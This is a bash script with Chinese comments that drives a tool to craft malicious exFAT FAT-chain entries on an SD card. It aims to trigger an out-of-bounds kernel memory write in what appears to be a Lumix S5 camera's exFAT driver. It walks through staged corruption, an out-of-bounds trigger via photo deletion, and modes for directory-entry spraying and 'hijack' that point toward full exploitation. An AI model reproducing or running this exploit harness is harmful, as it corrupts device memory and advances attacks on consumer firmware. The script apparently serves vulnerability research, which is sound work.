#!/bin/bash
# s5_exfat_test.sh — DC-S5 exFAT 越界写验证（第 1 级 / 第 2 级）分阶段执行
#
# 为什么必须 sudo：macOS 读写原始磁盘设备需要 root。
# 为什么必须 exFAT：该漏洞在 exFAT 驱动的位图分配路径（vol_amap/clr_alloc_bitmap），
#                   FAT32 不走这条路。
#
# 用法（在【相机已把该卡格式化过】之后，卡插在 Mac 上）：
#   sudo bash s5_exfat_test.sh prep    /dev/diskN s1
#   #  → 解析 BPB、校验 Boot Checksum、列出 DCIM 下的文件与簇链
#   sudo bash s5_exfat_test.sh l1      /dev/diskN s1 <文件起始簇> <范围内的簇号>
#   #  → 第 1 级：FAT 链尾改成【正常范围】的簇号（不越界）
#   #    然后拔卡插进相机：能否正常使用？照片能否显示/删除？卡会不会被要求格式化？
#   sudo bash s5_exfat_test.sh restore /dev/diskN s1
#   sudo bash s5_exfat_test.sh l2      /dev/diskN s1 <文件起始簇> <越界值>
#   #  → 第 2 级：FAT 链尾改成【越界值】
#   #    然后拔卡插进相机，删除那张照片：
#   #      相机报"写入错误 请检查卡" ⇒ 内核内存位清除【已执行】⇒ 漏洞成立
#   sudo bash s5_exfat_test.sh restore /dev/diskN s1
#
# 安全提示：第 2 级是内核内存破坏，可能崩溃/需拔电池。请用牺牲卡。

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
PY="python3"
TOOL="${HERE}/exfat_patch.py"

usage() { sed -n '2,30p' "$0"; exit 2; }

# 自动识别"我们的那张卡"：卷名 LUMIX + ExFAT + 容量 >= 60GB
# （卡拔插后设备节点会变，例如 disk8s1 -> disk9s1，不能硬编码）
detect_lumix_exfat() {
  local d info size
  for d in $(diskutil list 2>/dev/null | grep -oE "disk[0-9]+s[0-9]+" | sort -u); do
    info=$(diskutil info "/dev/${d}" 2>/dev/null) || continue
    echo "${info}" | grep -q "ExFAT" || continue
    echo "${info}" | grep -q "LUMIX" || continue
    size=$(echo "${info}" | awk -F'[()]' '/Disk Size/{print $2}' | grep -oE '[0-9]+')
    [ -n "${size}" ] && [ "${size}" -gt 60000000000 ] 2>/dev/null && { echo "${d}"; return 0; }
  done
  return 1
}
[ $# -lt 2 ] && usage
MODE="$1"; DEV="$2"

echo "############ s5_exfat_test.sh  mode=${MODE}  dev=${DEV}  $(date '+%F %T') ############"

# ---- 必须先卸载：原始磁盘访问在卷挂载状态下会 "Resource busy" ----
echo ""
echo "=== 卸载卷（原始访问前必须） ==="
diskutil unmount force "${DEV}" 2>&1 | sed 's/^/  /' || true
sleep 1
# 若仍被占用，连整个物理盘一起卸载
if ! python3 -c "import sys;open(sys.argv[1],'rb',buffering=0).read(1)" "${DEV}" 2>/dev/null; then
  PHYS=$(echo "${DEV}" | sed 's/s[0-9]*$//')
  echo "  仍被占用，尝试卸载整个磁盘 ${PHYS} …"
  diskutil unmountDisk force "${PHYS}" 2>&1 | sed 's/^/  /' || true
  sleep 2
fi

# ---- 确认是 exFAT ----
python3 - "$DEV" <<'PYEOF'
import sys
try:
    f=open(sys.argv[1],'rb',buffering=0); s=f.read(512)
except Exception as e:
    print("!! 无法读取 %s : %s" % (sys.argv[1], e))
    print("   · 若为 Resource busy：卡还在挂载，先执行  diskutil unmount force %s" % sys.argv[1])
    print("   · 若为 Operation not permitted：终端需要【完全磁盘访问权限】")
    raise SystemExit(1)
if s[3:11] != b"EXFAT   ":
    print("!! 这不是 exFAT 卷（sector0[3:11] = %r）" % s[3:11])
    print("   漏洞在 exFAT 驱动路径上，FAT32 卡测不出。请用相机格式化该卡。")
    raise SystemExit(2)
print("✅ 确认是 exFAT 卷")
PYEOF
[ $? -ne 0 ] && exit 1

case "${MODE}" in
  prep)
    echo ""
    ${PY} "${TOOL}" info "${DEV}"
    echo ""
    echo "=== DCIM 下的文件 ==="
    ${PY} "${TOOL}" entries "${DEV}" "/DCIM" || true
    echo ""
    echo "=== 目录 /DCIM/100_PANA ==="
    ${PY} "${TOOL}" entries "${DEV}" "/DCIM/100_PANA" || true
    echo ""
    echo "下一步：用上面打印出的某个 JPG 的 start_clu 跑 l1。"
    ;;
  l1)
    [ $# -lt 4 ] && { echo "用法: l1 <dev> <起始簇> <范围内簇号>"; exit 2; }
    START="$3"; VAL="$4"
    echo ""
    echo "== 第 1 级：链尾 -> 范围内的簇 ${VAL}（不触发越界）=="
    ${PY} "${TOOL}" chain "${DEV}" "${START}" | tail -5
    ${PY} "${TOOL}" --level1 "${DEV}" "${START}" "${VAL}"
    echo ""
    echo "== 写后回读校验 =="
    ${PY} "${TOOL}" chain "${DEV}" "${START}" | tail -3
    echo ""
    echo "★ 现在拔卡插进 S5，检查这三件事并记下来："
    echo "   1) 相机能不能正常识别这张卡（会不会提示格式化/卡错误）"
    echo "   2) 那张照片能不能显示（画面可能花，但不应该提示卡坏）"
    echo "   3) 能不能删除它（这是关键：删除会走 free 路径）"
    echo "   4) 有没有出现 '写入错误 请检查卡'"
    ;;
  l2)
    [ $# -lt 4 ] && { echo "用法: l2 <dev> <起始簇> <越界值>"; exit 2; }
    START="$3"; VAL="$4"
    echo ""
    echo "== 第 2 级：链尾 -> 越界值 $VAL =="
    ${PY} "${TOOL}" chain "${DEV}" "${START}" | tail -5
    ${PY} "${TOOL}" --level2 "${DEV}" "${START}" "${VAL}"
    echo ""
    echo "== 写后回读校验 =="
    ${PY} "${TOOL}" chain "${DEV}" "${START}" | tail -3
    echo ""
    echo "★ 现在拔卡插进 S5，执行【删除那张照片】，然后观察："
    echo "   · 报 '写入错误 请检查卡'  ⇒ 卡写失败；而 clr_alloc_bitmap() 是"
    echo "     【先内存写、后卡写】⇒ 内存位清除【已经执行】⇒ 漏洞成立"
    echo "   · 卡正常删除且无报错  ⇒ 该簇号可能未越界，或本机无此缺陷"
    echo "   · 相机死机/黑屏         ⇒ 命中了无效槽位（准备拔电池）"
    ;;
  setfat)
    [ $# -lt 4 ] && { echo "用法: setfat <dev> <簇号> <值>"; exit 2; }
    diskutil unmount force "${DEV}" >/dev/null 2>&1 || true
    ${PY} "${TOOL}" setfat "${DEV}" "$3" "$4"
    ;;
  go1)
    ${PY} "${TOOL}" go1 "${DEV}" "${3:-auto}" "${4:-/DCIM/100_PANA}"
    ;;
  session)
    echo ""
    echo "############################################################"
    echo "###  一体化流程：打补丁 → (你去相机删除) → 自动比对裁决      ###"
    echo "############################################################"
    ${PY} "${TOOL}" go1 "${DEV}" "${3:-auto}" "${4:-/DCIM/100_PANA}"
    RC=$?
    if [ "${RC}" != "0" ]; then
      echo ""
      echo "!!! go1 未成功（RC=${RC}）—— 不要去相机！把上面的输出发给维护者 !!!"
      exit 1
    fi
    echo ""
    echo "############################################################"
    echo "###  ★ 现在请拔卡插进相机：                                ###"
    echo "###    1) 删除上面 [0/4] 里选中的那张 JPG（只删这一张）      ###"
    echo "###    2) 关机、拔卡、插回 Mac                              ###"
    echo "###  完成回来后，在这里按【回车】继续                        ###"
    echo "############################################################"
    read -r _ENTER
    echo ""
    echo "=== 收到回车，开始比对 ==="
    NEWDEV=$(detect_lumix_exfat) || true
    if [ -n "${NEWDEV:-}" ] && [ "${NEWDEV}" != "${DEV}" ]; then
      echo "[i] 设备节点已变化: ${DEV} -> /dev/${NEWDEV}（卡拔插后正常现象）"
      DEV="/dev/${NEWDEV}"
    fi
    echo "[i] 使用设备 ${DEV}"
    diskutil unmount force "${DEV}" 2>&1 | sed 's/^/  /' || true
    sleep 1
    ${PY} "${TOOL}" go1check "${DEV}"
    ;;
  go1check)
    ${PY} "${TOOL}" go1check "${DEV}"
    ;;
  dumpbitmap)
    [ $# -lt 3 ] && { echo "用法: dumpbitmap <dev> <输出文件>"; exit 2; }
    ${PY} "${TOOL}" dumpbitmap "${DEV}" "$3"
    ;;
  go2)
    ${PY} "${TOOL}" go2 "${DEV}" "${3:-auto}" "${4:-524290}"
    ;;
  sessionA)
    ${PY} "${TOOL}" sessionA "${DEV}" "${3:-auto}" "${4:-14}"
    RC=$?
    if [ "${RC}" != "0" ]; then
      echo "!!! sessionA 未成功（RC=${RC}）—— 不要去相机 !!!"; exit 1
    fi
    read -r _ENTER
    echo ""
    echo "=== 收到回车，开始比对 ==="
    NEWDEV=$(detect_lumix_exfat) || true
    [ -n "${NEWDEV:-}" ] && DEV="/dev/${NEWDEV}"
    diskutil unmount force "${DEV}" >/dev/null 2>&1 || true
    sleep 1
    ${PY} "${TOOL}" verdict "${DEV}"
    ;;
  hijack)
    [ $# -lt 4 ] && { echo "用法: hijack <dev> <文件名> <新num_ext>"; exit 2; }
    ${PY} "${TOOL}" hijack "${DEV}" "$3" "$4"
    ;;
  checkalloc)
    ${PY} "${TOOL}" checkalloc "${DEV}"
    ;;
  mkdeleted)
    [ $# -lt 3 ] && { echo "用法: mkdeleted <dev> <数量>"; exit 2; }
    ${PY} "${TOOL}" mkdeleted "${DEV}" "$3"
    ;;
  trimdir)
    [ $# -lt 3 ] && { echo "用法: trimdir <dev> <保留槽位数>"; exit 2; }
    ${PY} "${TOOL}" trimdir "${DEV}" "$3"
    ;;
  mkentries)
    [ $# -lt 4 ] && { echo "用法: mkentries <dev> <数量> <名字长度> [起始序号]"; exit 2; }
    ${PY} "${TOOL}" mkentries "${DEV}" "$3" "$4" "${5:-0}"
    ;;
  mkspray)
    ${PY} "${TOOL}" mkspray "${DEV}" "${3:-120}" "${4:-14}" "${5:-0}"
    ;;
  verdict)
    ${PY} "${TOOL}" verdict "${DEV}"
    ;;
  info)
    ${PY} "${TOOL}" info "${DEV}"
    ;;
  entries)
    ${PY} "${TOOL}" entries "${DEV}" "${3:-/}"
    ;;
  bitmap)
    ${PY} "${TOOL}" bitmap "${DEV}"
    ;;
  chain)
    [ $# -lt 3 ] && { echo "用法: chain <dev> <起始簇>"; exit 2; }
    ${PY} "${TOOL}" chain "${DEV}" "$3"
    ;;
  restore)
    ${PY} "${TOOL}" restore "${DEV}"
    echo "★ 请把卡插回 S5 确认恢复正常。"
    ;;
  *) usage ;;
esac

echo ""
echo "############ 完成 $(date '+%F %T') ############"
